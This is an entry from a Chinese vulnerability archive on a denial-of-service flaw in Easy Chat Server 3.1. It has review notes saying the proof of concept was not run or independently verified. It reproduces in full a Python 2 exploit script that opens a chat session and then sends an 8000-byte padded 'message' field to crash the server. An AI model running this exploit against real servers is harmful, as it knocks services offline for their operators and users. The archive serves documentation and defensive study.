---
source: "白阁文库 BaizeSec/bylibrary"
title: "Easy Chat Server message长输入DoS"
product: "Easy Chat Server"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "3.1 Windows7 x86/x64声明；80端口"
prerequisites: "先GET建聊天会话"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/Easy%20Chat%20Server/Easy%20Chat%20Server%203.1%20%E2%80%98message%E2%80%99%20Denial%20of%20Service.md"
id: "vw-3eae9ee539851b74a011f8f2"
entity_id: "ve-3eae9ee539851b74a011f8f2"
schema_version: "1"
---

# Easy Chat Server message长输入DoS

## 条目说明

- 对象与具体问题：Easy Chat Server；message长输入DoS
- 版本、配置及部署条件：3.1 Windows7 x86/x64声明；80端口
- 认证与权限前提：先GET建聊天会话
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 整篇只Python2脚本无解释标题/修复；POST无Content-Length需协议行为核验
- 第一请求会话未保存Cookie而脚本依用户名状态，须说明前提
- 8000字节消息意图崩溃，不能作为安全检测；recv异常也不能证明服务崩溃
- 无CVE/供应商修复或崩溃栈

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

```
#!/usr/bin/python
#---------------------------------------------------------
# Title: Easy Chat Server Version 3.1 - (DOS)
# Date: 2019-05-07
# Author: Miguel Mendez Z
# Team: www.exploiting.cl
# Vendor: http://www.echatserver.com
# Software Link: http://www.echatserver.com/ecssetup.exe
# Platforms: Windows
# Version: 3.1
# Tested on: Windows Windows 7_x86/7_x64 [eng]
#---------------------------------------------------------
#
# 1- Primer socket con (GET) generamos una sesion valida para luego hacer el paso 2.
# 2- Segundo enviamos (POST) la data en la variable message para crashear la aplicacion.

import os, sys, socket
from time import sleep

ip = '127.0.0.1'
padding = 'A' * 8000

GET = (
"GET /chat.ghp?username=1&password=&room=1&sex=1 HTTP/1.1\r\n"
"User-Agent: Mozilla/4.0\r\n"
"Host: "+str(ip)+":80\r\n"
"Accept-Language: en-us\r\n"
"Accept-Encoding: gzip, deflate\r\n"
"Referer: http://"+str(ip)+"\r\n"
"Connection: Keep-Alive\r\n\r\n"
)

try:
  print "\n [*] Ejecutando payload GET (Creando Sesion) - length " + str(len(GET))
  s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s1.connect((ip, 80))
  s1.send(GET)
  s1.recv(1024)
  s1.close()
except:
  print "Sin conexion GET"

sleep(3)

POST = (
"POST /body2.ghp?username=1&password=&room=1 HTTP/1.1\r\n"
"Host: "+str(ip)+"\r\n"
"User-Agent: Mozilla/4.0\r\n"
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
"Accept-Language: es-CL,en-US;q=0.5\r\n"
"Accept-Encoding: gzip, deflate\r\n"
"Referer: http://"+str(ip)+"/chatsubmit.ghp?username=1&password=&room=1\r\n"
"Content-Type: application/x-www-form-urlencoded\r\n\r\n"
"staticname=%3A000539&tnewname=&msayinfo=1&mnewname=&mtowho=All&mfilters=0&mfont=0&mfcolor=1&elist=&seltype=Theme&msg=&Submit=Send&sc=on&notifysound=on&message="+str(padding)+"&chat_flag="
)

try:
  print " [*] Ejecutando payload POST (Crashing) - length " + str(len(POST))
  s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s2.connect((ip, 80))
  s2.send(POST)
  s2.recv(1024)
  s2.close()
except:
  print "Sin conexion POST"
            
```


---

> 来源：白阁文库 BaizeSec/bylibrary
